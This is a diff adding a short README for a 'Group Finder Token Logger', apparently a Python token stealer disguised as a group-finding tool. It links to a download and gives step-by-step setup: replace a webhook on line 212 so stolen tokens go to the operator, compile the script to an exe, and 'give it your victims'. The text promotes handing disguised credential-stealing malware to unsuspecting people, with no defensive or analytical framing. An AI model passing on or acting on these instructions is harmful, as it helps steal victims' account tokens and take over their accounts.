@@ -1,0 +1,11 @@
+Group Finder Token Logger
+---------------------------------------------------
+https://link-to.net/334777/grouplogger
+---------------------------------------------------
+Step 1. Install Python https://python.org/ (your victims DON'T need it, you do to set it up)
+Step 2. Download the .py file
+Step 3. Right Click it => Edit
+Step 4. Go to line 212 and replace the webhook
+Step 5. Save it then make it an exe (ill show how to later)
+Step 6. Give it yo ur victims, ezzzz
+PREVIEW: https://www.youtube.com/watch?v=Jk7rU9hv4d0
